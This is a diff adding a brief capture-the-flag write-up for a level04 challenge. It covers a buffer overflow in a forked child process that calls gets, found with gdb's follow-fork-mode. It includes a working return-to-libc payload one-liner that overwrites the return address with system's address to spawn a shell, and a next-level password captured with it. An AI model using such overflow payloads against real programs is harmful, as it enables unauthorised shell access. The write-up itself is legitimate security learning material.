@@ -1,0 +1,17 @@
+In this level, the program do a fork and run on the child the gets functions
+so we can do buffer overflow attack on the child
+to be able to track the child and find when the overflow happen we can use in gdb
+
+set follow-fork-mode child
+
+then try multiple workload until we find the return address location
+it turns out that it is located after 152 bytes from the buffer starts
+
+so we can fill the buffer with 152 character and then give system function address
+
+~$ python -c "print 'tsts'*36 + 'sh  ' + '\xec\x97\xf8\xf7' + '\xec\x97\xf8\xf7' +'\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7'" > /tmp/file
+~$ cat /tmp/file - | ./level04
+Give me some shellcode, k
+cd ../level05
+cat .pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
